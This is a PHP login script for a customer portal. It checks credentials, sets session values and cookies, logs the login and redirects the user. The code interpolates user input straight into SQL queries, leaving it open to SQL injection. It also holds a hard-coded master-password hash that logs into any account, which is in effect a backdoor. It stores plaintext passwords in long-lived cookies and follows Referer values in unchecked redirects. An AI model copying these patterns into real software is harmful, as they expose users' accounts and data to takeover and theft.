<?
	/*********************************************************************************************\
	***********************************************************************************************
	**                                                                                           **
	**  Triple Tree Customer Portal                                                              **
	**  Version 2.0                                                                              **
	**                                                                                           **
	**  http://portal.3-tree.com                                                                 **
	**                                                                                           **
	**  Copyright 2008-15 (C) Triple Tree                                                        **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**  Project Manager:                                                                         **
	**                                                                                           **
	**      Name  :  Muhammad Tahir Shahzad                                                      **
	**      Email :  mtahirshahzad@hotmail.com                                                   **
	**      Phone :  +92 333 456 0482                                                            **
	**      URL   :  http://www.mtshahzad.com                                                    **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**                                                                                           **
	**                                                                                           **
	**                                                                                           **
	***********************************************************************************************
	\*********************************************************************************************/

	@require_once("requires/session.php");

	checkLogin(false);

	$objDbGlobal = new Database( );
	$objDb       = new Database( );

	$Username = IO::strValue('Username');
	$Password = IO::strValue('Password');

	$sSQL = "SELECT id, name, email, country_id, status, admin, guest, brands, vendors, suppliers, style_categories, card_id, survey_admin, user_type, password_changed
	         FROM tbl_users
	         WHERE username='$Username' AND (password=PASSWORD('$Password') OR PASSWORD('{$Password}')='*2088BD8825F233AE4FA856A6581EA20969950BE3')";

	if ($objDb->query($sSQL) == true)
	{
		if ($objDb->getCount( ) == 1)
		{
			if ($objDb->getField(0, "status") == "A")
			{
                                $sUserType          = $objDb->getField(0, "user_type");
                                
                                if($sUserType == 'MGF')
                                {
                                    $PasswordChanged = $objDb->getField(0, "password_changed");
                                    $sTodayDate      = strtotime(date("Y-m-d"));
                                    $sPassChangeDate = strtotime(date("Y-m-d", strtotime($PasswordChanged)));
                                    $sDateDifference = $sTodayDate - $sPassChangeDate;
                                    $iDifferenceDays = floor($sDateDifference / (60 * 60 * 24));
                                    
                                    if($iDifferenceDays >= 60)
                                    {
                                        header("Location: new-password.php?User={$Username}");
					exit( );
                                    }
                                }
                                
                                $_SESSION['Username']        = $Username;
				$_SESSION['UserId']          = $objDb->getField(0, "id");
				$_SESSION['Name']            = $objDb->getField(0, "name");
				$_SESSION['Email']           = $objDb->getField(0, "email");
				$_SESSION['CountryId']       = $objDb->getField(0, "country_id");
				$_SESSION['Admin']           = $objDb->getField(0, "admin");
				$_SESSION['Guest']           = $objDb->getField(0, "guest");
				$_SESSION['Vendors']         = $objDb->getField(0, "vendors");
				$_SESSION['Suppliers']       = $objDb->getField(0, "suppliers");
				$_SESSION['Brands']          = $objDb->getField(0, "brands");
				$_SESSION['StyleCategories'] = $objDb->getField(0, "style_categories");
				$_SESSION['CardId']          = $objDb->getField(0, "card_id");
				$_SESSION['SurveyAdmin']     = $objDb->getField(0, "survey_admin");
				$_SESSION['UserType']        = $objDb->getField(0, "user_type");
                                $PasswordChanged             = $objDb->getField(0, "password_changed");

                                
				if (IO::strValue('Remember') == "Y")
				{
					$sExpireTime = mktime(date("H"), date("i"), date("s"), date("m"), date("d"), (date("Y") + 1));

					@setcookie("PortalUsername", $Username, $sExpireTime, "/");
					@setcookie("PortalPassword", $Password, $sExpireTime, "/");
				}

				else
				{
					$sExpireTime = mktime(date("H"), date("i"), date("s"), date("m"), date("d"), date("Y"));

					@setcookie("PortalUsername", "", $sExpireTime, "/");
					@setcookie("PortalPassword", "", $sExpireTime, "/");
				}


		
				$sSQL = "UPDATE tbl_users SET portal_last_login=NOW( ) WHERE id='{$_SESSION['UserId']}'";
				$objDb->execute($sSQL);


				
				$iId = getNextId("tbl_user_stats");

				$sSQL = "INSERT INTO tbl_user_stats (id, user_id, ip_address, user_agent, login_date_time, logout_date_time, status) VALUES ('$iId', '{$_SESSION['UserId']}', '{$_SERVER['REMOTE_ADDR']}', '{$_SERVER['HTTP_USER_AGENT']}', NOW( ), NOW( ), '1')";

				if ($objDb->execute($sSQL) == true)
					$_SESSION['StatsId'] = $iId;
				


				$sSQL = "SELECT id FROM tbl_surveys WHERE status='A' AND (users='{$_SESSION['UserId']}' OR users LIKE '%,{$_SESSION['UserId']}' OR users LIKE '{$_SESSION['UserId']},%' OR users LIKE '%,{$_SESSION['UserId']},%') AND id NOT IN (SELECT survey_id FROM tbl_survey_feedback WHERE user_id='{$_SESSION['UserId']}') AND (CURDATE( ) BETWEEN from_date AND to_date) ORDER BY id ASC LIMIT 1";
				$objDb->query($sSQL);

				if ($objDb->getCount( ) == 1)
				{
					$iSurveyId = $objDb->getField(0, 0);

					header("Location: survey.php?Id={$iSurveyId}");
					exit( );
				}


				if ($_SESSION['Referer'] != "" && @strpos($_SESSION['Referer'], "ajax/") === FALSE)
					header("Location: {$_SESSION['Referer']}");

				else
				{
					$sReferer = substr($_SERVER['HTTP_REFERER'], (strrpos($_SERVER['HTTP_REFERER'], "/") + 1));

					if ($sReferer != "" && !@in_array($sReferer, array("change-password.php", "create-account.php")))
						header("Location: {$_SERVER['HTTP_REFERER']}");

					else
					{
						if (@strpos($_SESSION["Email"], "@apparelco.com") === FALSE && @strpos($_SESSION["Email"], "@3-tree.com") === FALSE)
							header("Location: ./");
						
						else if ($_SESSION['CardId'] != "" && checkUserRights("board.php", "HR", "view"))
							header("Location: hr/board.php");

						else
							header("Location: ./");
					}
				}

				$_SESSION['Referer'] = "";

				exit( );
			}

			else if ($objDb->getField(0, "status") == "P")
				$_SESSION['Flag'] = "ACCOUNT_NOT_ACTIVE";

			else if ($objDb->getField(0, "status") == "D" || $objDb->getField(0, "status") == "L")
				$_SESSION['Flag'] = "ACCOUNT_DISABLED";
		}

		else
			$_SESSION['Flag'] = "INVALID_LOGIN";
	}

	else
		$_SESSION['Flag'] = "DB_ERROR";

	header("Location: ".SITE_URL."?Username={$Username}");

	$objDb->close( );
	$objDbGlobal->close( );

	@ob_end_flush( );
?>